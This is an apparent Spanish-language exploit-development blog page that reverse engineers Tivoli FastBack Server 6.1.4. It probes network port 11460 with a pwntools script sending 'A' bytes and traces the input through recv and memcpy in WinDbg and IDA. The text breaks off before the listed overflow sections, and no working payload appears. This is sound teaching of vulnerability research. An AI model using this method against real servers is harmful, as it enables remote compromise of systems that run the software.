<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Reverse Engineering</title>

  <meta name="description" content="Reverse engineering para buscar bugs en aplicaciones">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Reverse Engineering">
  <meta name="twitter:description" content="Reverse engineering para buscar bugs en aplicaciones">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/exploit-development/windows-user/reverse-engineering/image.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Reverse Engineering">
  <meta property="og:description" content="Reverse engineering para buscar bugs en aplicaciones">
  <meta property="og:image" content="/exploit-development/windows-user/reverse-engineering/image.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/exploit-development/windows-user/reverse-engineering/image.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Reverse Engineering" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/exploit-development/windows-user" title="xchg2pwn" class="blog-button">Windows User Mode</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#installation">Installation</a></li>
        <li><a href="#interacting">Interacting</a></li>
        <li><a href="#protocol">Protocol</a></li>
        <li><a href="#seh">SEH Overflow</a></li>
        <li><a href="#stack">Stack Overflow</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">Exploit Development</h2>
    <picture><img src="/exploit-development/windows-user/reverse-engineering/image.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Reverse Engineering</h2><br>
  </header>

<section class="post" id="index">
    <br><p class="plain-text">En explotaciones anteriores tomabamos un poc de <code class="language-plaintext highlighter-rouge">exploitdb</code> y a partir de el explotabamos la vulnerabilidad, en este post aprenderemos a buscar vulnerabilidades en los programas realizando reversing y entendiendo como trabaja con las entradas que recibe y a partir de ellos intentar provocar un error de corrupción de memoria</p>
</section>

<section class="post" id="installation">
<br><h3 class="post-title">Installation</h3><br>

<p class="plain-text">Para este post utilizaremos la aplicación <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/FastBackServer_6.1.4/FastBack.exe">Tivoli FastBack Server</a> en su versión <code class="language-plaintext highlighter-rouge">6.1.4</code>, asi que iniciamos usando el instalador que nos instalará la versión de prueba, Para este caso específico seleccionaremos la opción Servidor de copia de seguridad</p>
<a href="/exploit-development/windows-user/reverse-engineering/1.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/1.png"></p></div></a>

<p class="plain-text">Luego de continuar aparecerá una ventana informando que ha ocurrido un error al inicial un servicio por falta de permisos, por ahora podemos simplemente ignorarlo</p>
<a href="/exploit-development/windows-user/reverse-engineering/2.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/2.png"></p></div></a>

<p class="plain-text">Al continuar se nos advierte que el driver que se intenta instalar no estan firmado y podria ser peligroso hacerlo, elegiremos instalarlo de todas formas</p>
<a href="/exploit-development/windows-user/reverse-engineering/3.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/3.png"></p></div></a>

<p class="plain-text">Al atacar un binario normalmente esperamos encontrar bugs lógicos y operaciones de memoria sin sanitizar, en esta aplicación intentaremos explotar de forma remota enviando datos maliciosos al programa a través del puerto de red de la aplicación, para comenzar podemos usar <a href="https://learn.microsoft.com/es-es/sysinternals/downloads/tcpview">TCPView</a> de Sysinternals para ver los puertos en uso</p>
<p class="plain-text"><code class="language-plaintext highlighter-rouge">TCPView</code> nos otorga información interesante, encontramos 2 procesos: <code class="language-plaintext highlighter-rouge">FastBackMount.exe</code> y <code class="language-plaintext highlighter-rouge">FastBackServer.exe</code> que estan asociados a <code class="language-plaintext highlighter-rouge">Tivoli</code>, por ahora nos concentraremos en <code class="language-plaintext highlighter-rouge">FastBackServer.exe</code> que escucha en los puertos TCP <code class="language-plaintext highlighter-rouge">1230</code>, <code class="language-plaintext highlighter-rouge">1406</code> y <code class="language-plaintext highlighter-rouge">11460</code>, es información interesante ya que podria ser un ataque <code class="language-plaintext highlighter-rouge">RCE</code> de forma reporta o <code class="language-plaintext highlighter-rouge">LPE</code> para escalar privilegios asumiendo que tiene altos privilegios, en este caso empezaremos con el puerto <code class="language-plaintext highlighter-rouge">11460</code> para analizar el programa</p>
<a href="/exploit-development/windows-user/reverse-engineering/4.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/4.png"></p></div></a>

</section>

<section class="post" id="interacting">
<br><h3 class="post-title">Interacting</h3><br>

<p class="plain-text">Nuestro objetivo sera interactuar con el puerto <code class="language-plaintext highlighter-rouge">11460</code> y ver su comportamiento, usaremos <code class="language-plaintext highlighter-rouge">WinDbg</code> para el análisis dinámico e <code class="language-plaintext highlighter-rouge">IDA</code> para el estático, para empezar abriremos <code class="language-plaintext highlighter-rouge">WinDbg</code> y nos adjuntaremos al proceso <code class="language-plaintext highlighter-rouge">FastBackServer.exe</code></p>

<p class="plain-text">El siguiente script simplemente se conectará al puerto <code class="language-plaintext highlighter-rouge">11460</code> y enviará varias <code class="language-plaintext highlighter-rouge">A's</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="mi"> *</span><span class="p">

payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 100</span><span class="p">

shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"Windows"</span><span class="p">,</span><span class="mi"> 11460</span><span class="p">)  
shell.send(payload)</span>
</code></pre></div></div><br>

<p class="plain-text">Con el fin de obtener un punto de apoyo establecemos un breakpoint en la función <code class="language-plaintext highlighter-rouge">recv</code>, está se utiliza para aceptar datos desde un puerto <code class="language-plaintext highlighter-rouge">tcp</code>, si nos detenemos ahi al enviar los datos podemos identificar el punto de entrada y seguir desde ahí</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp wsock32!recv  

</span><span class="ro">0:000></span><span class="p"> g</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit code <code class="language-plaintext highlighter-rouge">WinDbg</code> se detendrá en el <code class="language-plaintext highlighter-rouge">breakpoint</code> de la aplicación, como se acaba de llamar la función el primer <code class="language-plaintext highlighter-rouge">dword</code> en el stack deberia ser la dirección de retorno y los otros <code class="language-plaintext highlighter-rouge">4 dwords</code> los argumentos de la función <code class="language-plaintext highlighter-rouge">recv</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> g</span><span class="p">
Breakpoint 0 hit
eax=00000b10 ebx=05fac210 ecx=04f58058 edx=04f58020 esi=05fac210 edi=00669360  
eip=6a981e90 esp=0d34fb58 ebp=0d34fe94 iopl=0         nv up ei pl nz na po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202  
WSOCK32!recv:
6a981e90 8bff            mov     edi,edi

</span><span class="ro">0:000></span><span class="p"> dds esp L5
0d34fb58  00581ae8 FastBackServer!FX_AGENT_Receive+0x1e2
0d34fb5c  00000b10
0d34fb60  04f58058
0d34fb64  00004400
0d34fb68  00000000</span>
</code></pre></div></div><br>

<p class="plain-text">Según la <a href="https://learn.microsoft.com/es-es/windows/win32/api/winsock/nf-winsock-recv">documentación</a> los argumentos son los siguientes, según este análisis se recibirá un máximo de <code class="language-plaintext highlighter-rouge">0x4400</code> bytes y se guardarán en la dirección <code class="language-plaintext highlighter-rouge">0x04f58058</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int </span><span class="na">recv</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">]  SOCKET s,
  [</span><span class="mi">out</span><span class="p">] </span><span class="no">char   </span><span class="o">*</span><span class="p">buf,
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">int    </span><span class="p">len,
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">int    </span><span class="p">flags
);</span>
</code></pre></div></div><br>

<p class="plain-text">Al continuar hasta el final de la función usando <code class="language-plaintext highlighter-rouge">pt</code> para ir hasta el siguiente ret podemos ver que el valor de retorno en <code class="language-plaintext highlighter-rouge">eax</code> es <code class="language-plaintext highlighter-rouge">0x64</code> o <code class="language-plaintext highlighter-rouge">100</code> en decimal que según documentación el valor devuelto es el numero de <code class="language-plaintext highlighter-rouge">bytes</code> y la dirección del segundo argumento <code class="language-plaintext highlighter-rouge">*buf</code> debería apuntar a los datos de nuestra entrada</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">pt 
eax=00000064 ebx=05fac210 ecx=959a3e03 edx=77941670 esi=05fac210 edi=00669360  
eip=6a981eeb esp=0d34fb58 ebp=0d34fe94 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
WSOCK32!recv+0x5b:
6a981eeb c21000          ret     10h

</span><span class="ro">0:000> </span><span class="p">? 0x64
Evaluate expression: 100 = 00000064

</span><span class="ro">0:000></span><span class="p"> db 0x04f58058
04f58058  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f58068  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f58078  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f58088  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f58098  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f580a8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f580b8  41 41 41 41 00 00 00 00-00 00 00 00 00 00 00 00  AAAA............  
04f580c8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................  </span>
</code></pre></div></div><br>

<p class="plain-text">Para iniciar el análisis estático con <code class="language-plaintext highlighter-rouge">IDA</code> primero necesitamos determinar que archivo examinar, ya que la función <code class="language-plaintext highlighter-rouge">recv</code> pudo haber sudo llamada por <code class="language-plaintext highlighter-rouge">FastBackServer.exe</code> o por alguna dll, con <code class="language-plaintext highlighter-rouge">k</code> podemos mostrar la pila de llamadas, todas las direcciones de retorno en la parte superior de la pila están vienen de <code class="language-plaintext highlighter-rouge">FastBackServer</code>, usando <code class="language-plaintext highlighter-rouge">lm</code> podemos encontrar la ruta donde se encuentra el binario <code class="language-plaintext highlighter-rouge">FastBackServer.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">k
 # ChildEBP RetAddr      
00 0d34fe94 0058164e     WSOCK32!recv+0x5b
01 0d34feb0 005815d3     FastBackServer!FX_AGENT_CopyReceiveBuff+0x18
02 0d34fec0 00581320     FastBackServer!FX_AGENT_GetData+0xd
03 0d34fef0 0048ca98     FastBackServer!FX_AGENT_Cyclic+0xd0
04 0d34ff48 006693e9     FastBackServer!ORABR_Thread+0xef
05 0d34ff80 754f9564     FastBackServer!_beginthreadex+0xf4
06 0d34ff94 7791293c     KERNEL32!BaseThreadInitThunk+0x24
07 0d34ffdc 77912910     ntdll!__RtlUserThreadStart+0x2b
08 0d34ffec 00000000     ntdll!_RtlUserThreadStart+0x1b

</span><span class="ro">0:000></span><span class="p"> lm m fastbackserver
Browse full module list
start    end        module name
00400000 00c0c000   FastBackServer   (coff symbols)         C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe  </span>
</code></pre></div></div><br>

<p class="plain-text">Ya que estamos en el <code class="language-plaintext highlighter-rouge">ret</code> la siguiente instrucción deberia saltar a la dirección de retorno y volver a donde se llamó originalmente a la función <code class="language-plaintext highlighter-rouge">recv</code>, podemos ver que ahora apunta a <code class="language-plaintext highlighter-rouge">0x00581ae8</code> que es parte de la función <code class="language-plaintext highlighter-rouge">FX_AGENT_Receive</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=00000064 ebx=05fac210 ecx=959a3e03 edx=77941670 esi=05fac210 edi=00669360
eip=00581ae8 esp=0d34fb6c ebp=0d34fe94 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FX_AGENT_Receive+0x1e2:
00581ae8 8945f8          mov     dword ptr [ebp-8],eax ss:0023:0d34fe8c=00000001  </span>
</code></pre></div></div><br>

<p class="plain-text">En IDA al pulsar la tecla <code class="language-plaintext highlighter-rouge">g</code> podemos ir a una dirección, en este caso iremos a donde nos retornó <code class="language-plaintext highlighter-rouge">recv</code>, para asi poder seguir el flujo a partir de donde recibe los datos</p>
<a href="/exploit-development/windows-user/reverse-engineering/57.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/57.png"></p></div></a>

<p class="plain-text">Llegamos al bloque donde retorna, una instrucción antes en la dirección <code class="language-plaintext highlighter-rouge">0x00581ae3</code> podemos ver la llamada, ahora podemos seguir el flujo estáticamente en <code class="language-plaintext highlighter-rouge">IDA</code>, después de la llamada, el valor devuelto en eax se almacena en <code class="language-plaintext highlighter-rouge">ebp + var_8</code> y se compara con <code class="language-plaintext highlighter-rouge">0xffffffff</code>, esto se hace para comprobar que tuvo exito ya que <code class="language-plaintext highlighter-rouge">0xffffffff</code> es igual a <code class="language-plaintext highlighter-rouge">-1</code> que indica que el código de estado es un <code class="language-plaintext highlighter-rouge">SOCKET_ERROR</code></p>
<a href="/exploit-development/windows-user/reverse-engineering/5.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/5.png"></p></div></a>

<p class="plain-text">Luego de la comparación se muestra un salto condicional, la instrucción <code class="language-plaintext highlighter-rouge">cmp</code> podemos verla como una substracción por lo que si el valor es igual la resta será igual a <code class="language-plaintext highlighter-rouge">0</code> y se activará la flag <code class="language-plaintext highlighter-rouge">zf</code>, la instrucción <code class="language-plaintext highlighter-rouge">jnz</code> o <code class="language-plaintext highlighter-rouge">jump if not zero</code> seguirá la linea verde si la comparación no fue exitosa, entonces si el valor devuelto es <code class="language-plaintext highlighter-rouge">-1</code> indica un error y <code class="language-plaintext highlighter-rouge">jnz</code> hace que siga la linea roja, de lo contrario la comparación indica que no es <code class="language-plaintext highlighter-rouge">-1</code> y seguirá la linea verde, este último es nuestro caso ya que devolvió <code class="language-plaintext highlighter-rouge">0x64</code></p>
<a href="/exploit-development/windows-user/reverse-engineering/6.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/6.png"></p></div></a>

<p class="plain-text">El primer <code class="language-plaintext highlighter-rouge">jnz</code> nos muestra <code class="language-plaintext highlighter-rouge">br=1</code>, esto indica el resultado de la bifurcación, en este caso como es <code class="language-plaintext highlighter-rouge">1</code> indica que se realizará el salto, tambien podemos ver que la flag <code class="language-plaintext highlighter-rouge">zf</code> es <code class="language-plaintext highlighter-rouge">0</code>, la siguiente instrucción es la comparación con <code class="language-plaintext highlighter-rouge">0</code> como habiamos visto en <code class="language-plaintext highlighter-rouge">IDA</code></P>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=00000064 ebx=05fac210 ecx=959a3e03 edx=77941670 esi=05fac210 edi=00669360
eip=00581aeb esp=0d34fb6c ebp=0d34fe94 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FX_AGENT_Receive+0x1e5:
00581aeb 837df8ff        cmp     dword ptr [ebp-8],0FFFFFFFFh ss:0023:0d34fe8c=00000064

</span><span class="ro">0:000></span><span class="p"> p
eax=00000064 ebx=05fac210 ecx=959a3e03 edx=77941670 esi=05fac210 edi=00669360
eip=00581aef esp=0d34fb6c ebp=0d34fe94 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
FastBackServer!FX_AGENT_Receive+0x1e9:
00581aef 7525            jne     FastBackServer!FX_AGENT_Receive+0x210 (00581b16) [br=1]  

</span><span class="ro">0:000> </span><span class="p">r zf
zf=0

</span><span class="ro">0:000></span><span class="p"> p
eax=00000064 ebx=05fac210 ecx=959a3e03 edx=77941670 esi=05fac210 edi=00669360
eip=00581b16 esp=0d34fb6c ebp=0d34fe94 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
FastBackServer!FX_AGENT_Receive+0x210:
00581b16 837df800        cmp     dword ptr [ebp-8],0  ss:0023:0d34fe8c=00000064</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que sabemos el resultado de los saltos <code class="language-plaintext highlighter-rouge">jnz</code> o <code class="language-plaintext highlighter-rouge">jne</code> anteriores podemos partir de ahí, el siguiente bloque muestra una llamada a la función <code class="language-plaintext highlighter-rouge">PERFMON_S_UpdateCounter</code></p>
<a href="/exploit-development/windows-user/reverse-engineering/7.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/7.png"></p></div></a>

<p class="plain-text">Para saber si es relevante podemos colocar un <code class="language-plaintext highlighter-rouge">hardware breakpoint</code> en el buffer que corresponde a nuestros datos y ejecutar la llamada, si el breakpoint no se activa podemos decir que es irrelevante para el caso, de lo contrario debemos entrar en la función y ver que procesos realiza con nuestros datos, sin embargo al ejecutar la llamada no pasó nada, significa que la función no hace nada con nuestro buffer por lo que podemos decir que es irrelevante para nuestro análisis y podemos continuar</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> ba r1 0x04f58058

</span><span class="ro">0:000></span><span class="p"> p
eax=00000064 ebx=05fac210 ecx=959a3e03 edx=77941670 esi=05fac210 edi=00669360  
eip=00581b1a esp=0d34fb6c ebp=0d34fe94 iopl=0         nv up ei pl nz na po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202  
FastBackServer!FX_AGENT_Receive+0x24f:
00581b55 83c408          add esp,8

</span><span class="ro">0:000> </span><span class="p">bc *</span>
</code></pre></div></div><br>

<p class="plain-text">El registro <code class="language-plaintext highlighter-rouge">eax</code> siempre actúa como valor de retorno de una función, en la última instrucción del bloque se establece en <code class="language-plaintext highlighter-rouge">1</code>, algo que podriamos interpretar como <code class="language-plaintext highlighter-rouge">true</code>, luego va al último bloque que restaura el stack y retorna saliendo de la función</code></p>
<a href="/exploit-development/windows-user/reverse-engineering/8.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/8.png"></p></div></a>

<p class="plain-text">Ya analizamos prácticamente toda la función que invocó a <code class="language-plaintext highlighter-rouge">recv</code>, sin embargo esto era dentro de la función <code class="language-plaintext highlighter-rouge">_FX_AGENT_Receive</code> por lo que ahora analizaremos la función que llamó a esta, para ello podemos simplemente ir hasta el <code class="language-plaintext highlighter-rouge">ret</code> y ver la dirección donde retorna, en este caso retorna a la dirección <code class="language-plaintext highlighter-rouge">0x0058164e</code> asi que podemos ir ahí</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">pt
eax=00000001 ebx=05fac210 ecx=04f58020 edx=00000064 esi=05fac210 edi=00669360  
eip=00581b69 esp=0d34fe98 ebp=0d34feb0 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
FastBackServer!FX_AGENT_Receive+0x263:
00581b69 c3              ret

</span><span class="ro">0:000></span><span class="p"> p
eax=00000001 ebx=05fac210 ecx=04f58020 edx=00000064 esi=05fac210 edi=00669360  
eip=0058164e esp=0d34fe9c ebp=0d34feb0 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
FastBackServer!FX_AGENT_CopyReceiveBuff+0x18:
0058164e 83c404          add     esp,4</span>
</code></pre></div></div><br>

<p class="plain-text">Si vamos a esa dirección el <code class="language-plaintext highlighter-rouge">IDA</code> podemos ver que en el mismo bloque una instrucción antes está la llamada a la función <code class="language-plaintext highlighter-rouge">_FX_AGENT_Receive</code> que analizamos anteriormente</code></p>
<a href="/exploit-development/windows-user/reverse-engineering/9.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/9.png"></p></div></a>

<p class="plain-text">Encontramos que el bloque termina con una comparación del retorno en <code class="language-plaintext highlighter-rouge">eax</code> con <code class="language-plaintext highlighter-rouge">0</code>, sabemos que devolvió <code class="language-plaintext highlighter-rouge">1</code> por lo que el <code class="language-plaintext highlighter-rouge">jnz</code> nos llevará por la linea verde que nuevamente tiene mas condicionales que tendríamos que analizar uno a uno</code></p>
<a href="/exploit-development/windows-user/reverse-engineering/10.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/10.png"></p></div></a>

<p class="plain-text">Nuevamente podemos establecer un <code class="language-plaintext highlighter-rouge">hardware breakpoint</code> en el buffer y ver si en algún punto se detiene, el flujo se detiene dentro de la función enlazada <code class="language-plaintext highlighter-rouge">memcpy</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=00000001 ebx=05fac210 ecx=04f58020 edx=00000064 esi=05fac210 edi=00669360
eip=00581654 esp=0d34fea0 ebp=0d34feb0 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
FastBackServer!FX_AGENT_CopyReceiveBuff+0x1e:
00581654 837df800        cmp     dword ptr [ebp-8],0  ss:0023:0d34fea8=00000001

</span><span class="ro">0:000></span><span class="p"> ba r1 0x04f58058

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=41414141 ebx=05fac210 ecx=00000001 edx=00000000 esi=04f58058 edi=04f5c458
eip=00666f70 esp=0d34fe84 ebp=0d34fe8c iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
FastBackServer!memcpy+0x130:
00666f70 89448ffc        mov     dword ptr [edi+ecx*4-4],eax ds:0023:04f5c458=00000000  

</span><span class="ro">0:000></span><span class="p"> bc *</span>
</code></pre></div></div><br>

<p class="plain-text">En la pila de llamadas podemos ver que <code class="language-plaintext highlighter-rouge">memcpy</code> se llamó desde la función donde estamos reverseando, la dirección normal de un <code class="language-plaintext highlighter-rouge">call</code> a un <code class="language-plaintext highlighter-rouge">dword</code> es de <code class="language-plaintext highlighter-rouge">5 bytes</code> por lo que podemos ver la instrucción donde se llama la función desde <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> k
 # ChildEBP RetAddr      
00 0d34fe8c 005816ea     FastBackServer!memcpy+0x130
01 0d34feb0 005815d3     FastBackServer!FX_AGENT_CopyReceiveBuff+0xb4  
02 0d34fec0 00581320     FastBackServer!FX_AGENT_GetData+0xd
03 0d34fef0 0048ca98     FastBackServer!FX_AGENT_Cyclic+0xd0
04 0d34ff48 006693e9     FastBackServer!ORABR_Thread+0xef
05 0d34ff80 754f9564     FastBackServer!_beginthreadex+0xf4
06 0d34ff94 7791293c     KERNEL32!BaseThreadInitThunk+0x24
07 0d34ffdc 77912910     ntdll!__RtlUserThreadStart+0x2b
08 0d34ffec 00000000     ntdll!_RtlUserThreadStart+0x1b

</span><span class="ro">0:000> </span><span class="p">u FastBackServer!FX_AGENT_CopyReceiveBuff + 0xb4 - 5 L1
FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf:
005816e5 e856570e00      call    FastBackServer!memcpy (00666e40)</span>
</code></pre></div></div><br>

<p class="plain-text">Establecemos un <code class="language-plaintext highlighter-rouge">breakpoint</code> en la llamada y volvemos a ejecutar el script, ahora podemos ver los argumentos de <code class="language-plaintext highlighter-rouge">memcpy</code> en el stack en forma de <code class="language-plaintext highlighter-rouge">dwords</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp FastBackServer!FX_AGENT_CopyReceiveBuff + 0xaf

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=04f7e458 ebx=05fcacd0 ecx=00000000 edx=04f7a020 esi=05fcacd0 edi=00669360  
eip=005816e5 esp=0d32fe94 ebp=0d32feb0 iopl=0         nv up ei pl nz na po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202  
FastBackServer!FX_AGENT_CopyReceiveBuff+0xaf:
005816e5 e856570e00      call    FastBackServer!memcpy (00666e40)

</span><span class="ro">0:000> </span><span class="p">dds esp L3
0d32fe94  04f7e458
0d32fe98  04f7a058
0d32fe9c  00000004</span>
</code></pre></div></div><br>

<p class="plain-text">La <a href="https://learn.microsoft.com/es-es/cpp/c-runtime-library/reference/memcpy-wmemcpy">documentación</a> nos dice que el primer argumento es el destino, el segundo el origen y el tercero la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code>, esto podemos interpretarlo como que se copian <code class="language-plaintext highlighter-rouge">4</code> bytes que es el tamaño de un <code class="language-plaintext highlighter-rouge">dword</code> del buffer original a uno nuevo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">void </span><span class="o">*</span><span class="na">memcpy</span><span class="p">(
   </span><span class="no">void </span><span class="o">*</span><span class="p">dest,
   </span><span class="o">const </span><span class="no">void </span><span class="o">*</span><span class="p">src,
   </span><span class="na">size_t </span><span class="p">count
);</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> db poi(esp + 4)
04f7a058  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f7a068  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
04f7a078  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
